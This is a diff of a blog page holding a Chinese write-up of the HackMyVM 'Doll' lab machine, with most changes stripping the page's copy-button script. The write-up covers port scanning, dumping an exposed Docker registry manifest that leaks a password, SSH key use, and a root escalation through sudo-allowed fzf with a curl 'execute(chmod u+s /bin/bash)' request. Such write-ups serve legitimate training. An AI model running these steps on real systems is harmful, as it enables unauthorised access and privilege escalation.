@@ -1132,17 +1132,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -1176,14 +1166,14 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>hmv_Doll</h1>
 <h1>0.闲聊</h1>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250129201949-6vewhf4.png"><img src="assets/image-20250129201949-6vewhf4.png" alt="image" style="max-width: 100%;"></a></p>
-<p><strong>靶机：</strong> <a href="https://hackmyvm.eu/machines/machine.php?vm=Doll" rel="nofollow">https://hackmyvm.eu/machines/machine.php?vm=Doll</a></p>
+<p><img src="assets/image-20250129201949-6vewhf4.png" alt="image" /></p>
+<p><strong>靶机：</strong> <a href="https://hackmyvm.eu/machines/machine.php?vm=Doll">https://hackmyvm.eu/machines/machine.php?vm=Doll</a></p>
 <p><strong>靶机 IP：</strong> 192.168.72.129</p>
 <p><strong>kali IP：</strong> 192.168.72.128</p>
 <p>今天年初二，有点空，更新一下wp</p>
 <h1>1.扫描</h1>
-<p>​<code class="notranslate">nmap</code>​开扫</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p>​<code>nmap</code>​开扫</p>
+<pre><code>┌──(kali㉿kali)-[~/test]
 └─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
 Nmap scan report for 192.168.72.129
@@ -1197,8 +1187,8 @@ MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
                                                                   
 </code></pre>
-<p>其中<code class="notranslate">1007</code>​不知道是什么服务，我们详细扫描一下</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p>其中<code>1007</code>​不知道是什么服务，我们详细扫描一下</p>
+<pre><code>┌──(kali㉿kali)-[~/test]
 └─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
 Nmap scan report for 192.168.72.129
@@ -1213,67 +1203,67 @@ Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds
 </code></pre>
 <p>不知道是什么东西，我们等会搜索一下</p>
 <h1>2.踩点</h1>
-<p>在<strong>hacktricks</strong>​上找到<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html" rel="nofollow">5000 - Pentesting Docker Registry</a>这篇文章</p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250129202845-u4dct3k.png"><img src="assets/image-20250129202845-u4dct3k.png" alt="image" style="max-width: 100%;"></a></p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<p>在<strong>hacktricks</strong>​上找到<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html">5000 - Pentesting Docker Registry</a>这篇文章</p>
+<p><img src="assets/image-20250129202845-u4dct3k.png" alt="image" /></p>
+<pre><code>┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.72.129:1007/v2/_catalog
-{"repositories":["dolly"]}
+{&quot;repositories&quot;:[&quot;dolly&quot;]}
                               
 </code></pre>
 <p>继续利用</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/test]
+<pre><code>┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
-{"name":"dolly","tags":["latest"]}
+{&quot;name&quot;:&quot;dolly&quot;,&quot;tags&quot;:[&quot;latest&quot;]}
                                                                                                                                      
 ┌──(kali㉿kali)-[~/test]
 └─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
 {
-   "schemaVersion": 1,
-   "name": "dolly",
-   "tag": "latest",
-   "architecture": "amd64",
-   "fsLayers": [
+   &quot;schemaVersion&quot;: 1,
+   &quot;name&quot;: &quot;dolly&quot;,
+   &quot;tag&quot;: &quot;latest&quot;,
+   &quot;architecture&quot;: &quot;amd64&quot;,
+   &quot;fsLayers&quot;: [
       {
-         "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
+         &quot;blobSum&quot;: &quot;sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017&quot;
       },
       {
-         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+         &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;
       },
       {
-         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
+         &quot;blobSum&quot;: &quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;
       },
       {
-         "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
+         &quot;blobSum&quot;: &quot;sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09&quot;
       }
    ],
-   "history": [
+   &quot;history&quot;: [
       {
-         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\",\"container_config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2023-04-25T08:58:11.460540528Z\",\"docker_version\":\"23.0.4\",\"id\":\"89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\",\"os\":\"linux\",\"parent\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\"}"
+         &quot;v1Compatibility&quot;: &quot;{\&quot;architecture\&quot;:\&quot;amd64\&quot;,\&quot;config\&quot;:{\&quot;Hostname\&quot;:\&quot;10ddd4608cdf\&quot;,\&quot;Domainname\&quot;:\&quot;\&quot;,\&quot;User\&quot;:\&quot;\&quot;,\&quot;AttachStdin\&quot;:true,\&quot;AttachStdout\&quot;:true,\&quot;AttachStderr\&quot;:true,\&quot;Tty\&quot;:true,\&quot;OpenStdin\&quot;:true,\&quot;StdinOnce\&quot;:true,\&quot;Env\&quot;:[\&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&quot;],\&quot;Cmd\&quot;:[\&quot;/bin/sh\&quot;],\&quot;Image\&quot;:\&quot;doll\&quot;,\&quot;Volumes\&quot;:null,\&quot;WorkingDir\&quot;:\&quot;\&quot;,\&quot;Entrypoint\&quot;:null,\&quot;OnBuild\&quot;:null,\&quot;Labels\&quot;:{}},\&quot;container\&quot;:\&quot;10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\&quot;,\&quot;container_config\&quot;:{\&quot;Hostname\&quot;:\&quot;10ddd4608cdf\&quot;,\&quot;Domainname\&quot;:\&quot;\&quot;,\&quot;User\&quot;:\&quot;\&quot;,\&quot;AttachStdin\&quot;:true,\&quot;AttachStdout\&quot;:true,\&quot;AttachStderr\&quot;:true,\&quot;Tty\&quot;:true,\&quot;OpenStdin\&quot;:true,\&quot;StdinOnce\&quot;:true,\&quot;Env\&quot;:[\&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\&quot;],\&quot;Cmd\&quot;:[\&quot;/bin/sh\&quot;],\&quot;Image\&quot;:\&quot;doll\&quot;,\&quot;Volumes\&quot;:null,\&quot;WorkingDir\&quot;:\&quot;\&quot;,\&quot;Entrypoint\&quot;:null,\&quot;OnBuild\&quot;:null,\&quot;Labels\&quot;:{}},\&quot;created\&quot;:\&quot;2023-04-25T08:58:11.460540528Z\&quot;,\&quot;docker_version\&quot;:\&quot;23.0.4\&quot;,\&quot;id\&quot;:\&quot;89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\&quot;,\&quot;os\&quot;:\&quot;linux\&quot;,\&quot;parent\&quot;:\&quot;1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\&quot;}&quot;
       },
       {
-         "v1Compatibility": "{\"id\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\",\"parent\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=devilcollectsit\"]},\"throwaway\":true}"
+         &quot;v1Compatibility&quot;: &quot;{\&quot;id\&quot;:\&quot;1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\&quot;,\&quot;parent\&quot;:\&quot;638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\&quot;,\&quot;comment\&quot;:\&quot;buildkit.dockerfile.v0\&quot;,\&quot;created\&quot;:\&quot;2023-03-29T18:19:24.45578926Z\&quot;,\&quot;container_config\&quot;:{\&quot;Cmd\&quot;:[\&quot;ARG passwd=devilcollectsit\&quot;]},\&quot;throwaway\&quot;:true}&quot;
       },
       {
-         "v1Compatibility": "{\"id\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"parent\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
+         &quot;v1Compatibility&quot;: &quot;{\&quot;id\&quot;:\&quot;638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\&quot;,\&quot;parent\&quot;:\&quot;cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\&quot;,\&quot;created\&quot;:\&quot;2023-03-29T18:19:24.45578926Z\&quot;,\&quot;container_config\&quot;:{\&quot;Cmd\&quot;:[\&quot;/bin/sh -c #(nop)  CMD [\\\&quot;/bin/sh\\\&quot;]\&quot;]},\&quot;throwaway\&quot;:true}&quot;
       },
       {
-         "v1Compatibility": "{\"id\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.348438709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \"]}}"
+         &quot;v1Compatibility&quot;: &quot;{\&quot;id\&quot;:\&quot;cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\&quot;,\&quot;created\&quot;:\&quot;2023-03-29T18:19:24.348438709Z\&quot;,\&quot;container_config\&quot;:{\&quot;Cmd\&quot;:[\&quot;/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \&quot;]}}&quot;
       }
    ],
-   "signatures": [
+   &quot;signatures&quot;: [
       {
-         "header": {
-            "jwk": {
-               "crv": "P-256",
-               "kid": "X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS",
-               "kty": "EC",
-               "x": "m6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c",
-               "y": "WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA"
+         &quot;header&quot;: {
+            &quot;jwk&quot;: {
+               &quot;crv&quot;: &quot;P-256&quot;,
+               &quot;kid&quot;: &quot;X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS&quot;,
+               &quot;kty&quot;: &quot;EC&quot;,
+               &quot;x&quot;: &quot;m6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c&quot;,
+               &quot;y&quot;: &quot;WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA&quot;
             },
-            "alg": "ES256"
+            &quot;alg&quot;: &quot;ES256&quot;
          },
-         "signature": "n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg",
-         "protected": "eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ"
+         &quot;signature&quot;: &quot;n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg&quot;,
+         &quot;protected&quot;: &quot;eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ&quot;
       }
    ]
 }                                                                                                                                     
@@ -1636,7 +1626,7 @@ VtVwCw==
                                              
 </code></pre>
 <p>省了，都不用爆破shadow了</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+<pre><code>┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
 └─$ ssh2john id_rsa &gt; hash
                                          
 ┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
@@ -1653,9 +1643,9 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 
 </code></pre>
 <p>爆破不出来，不会是用这个吧</p>
-<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250129204242-qkg0s6r.png"><img src="assets/image-20250129204242-qkg0s6r.png" alt="image" style="max-width: 100%;"></a></p>
+<p><img src="assets/image-20250129204242-qkg0s6r.png" alt="image" /></p>
 <p>试试</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+<pre><code>┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
 └─$ chmod 600 id_rsa 
 
 ┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
@@ -1679,7 +1669,7 @@ uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),3
 
 </code></pre>
 <h1>3.提权</h1>
-<pre class="notranslate"><code class="notranslate">bela@doll:~$ sudo -l
+<pre><code>bela@doll:~$ sudo -l
 Matching Defaults entries for bela on doll:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -1687,11 +1677,11 @@ User bela may run the following commands on doll:
     (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
 
 </code></pre>
-<p>​<code class="notranslate">fzf</code>​ 是一个交互式命令行模糊查找工具，并且其 <code class="notranslate">--listen</code>​ 选项允许它接收来自远程连接的命令。<code class="notranslate">fzf</code>​ 支持 <code class="notranslate">execute</code>​ 绑定，我们可以通过它来执行任意命令，包括启动 <code class="notranslate">bash</code>​ 或 <code class="notranslate">sh</code>​ 以获取 root shell。</p>
-<pre class="notranslate"><code class="notranslate">bela@doll:~$ sudo /usr/bin/fzf --listen=1337
+<p>​<code>fzf</code>​ 是一个交互式命令行模糊查找工具，并且其 <code>--listen</code>​ 选项允许它接收来自远程连接的命令。<code>fzf</code>​ 支持 <code>execute</code>​ 绑定，我们可以通过它来执行任意命令，包括启动 <code>bash</code>​ 或 <code>sh</code>​ 以获取 root shell。</p>
+<pre><code>bela@doll:~$ sudo /usr/bin/fzf --listen=1337
 </code></pre>
 <p>去重新登录一个窗口</p>
-<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+<pre><code>┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
 └─$ ssh bela@192.168.72.129 -i id_rsa   
 Enter passphrase for key 'id_rsa': 
 Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
@@ -1704,18 +1694,19 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Thu Jan 30 02:44:26 2025 from 192.168.72.128
 
-bela@doll:~$ curl -X POST --data '{"call":"execute","args":["chmod u+s /bin/bash"]}' http://127.0.0.1:1337
-unknown action: {"call":"execute","args":["/bin/bash"]}
+bela@doll:~$ curl -X POST --data '{&quot;call&quot;:&quot;execute&quot;,&quot;args&quot;:[&quot;chmod u+s /bin/bash&quot;]}' http://127.0.0.1:1337
+unknown action: {&quot;call&quot;:&quot;execute&quot;,&quot;args&quot;:[&quot;/bin/bash&quot;]}
 bela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337
 
 </code></pre>
 <p>成功拿到root shell</p>
-<pre class="notranslate"><code class="notranslate">bela@doll:~$ bash -p
+<pre><code>bela@doll:~$ bash -p
 bash-5.1# id
 uid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
 
 </code></pre>
-<p>‍</p></div>
+<p>‍</p>
+</div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -1740,7 +1731,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
@@ -1787,70 +1778,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
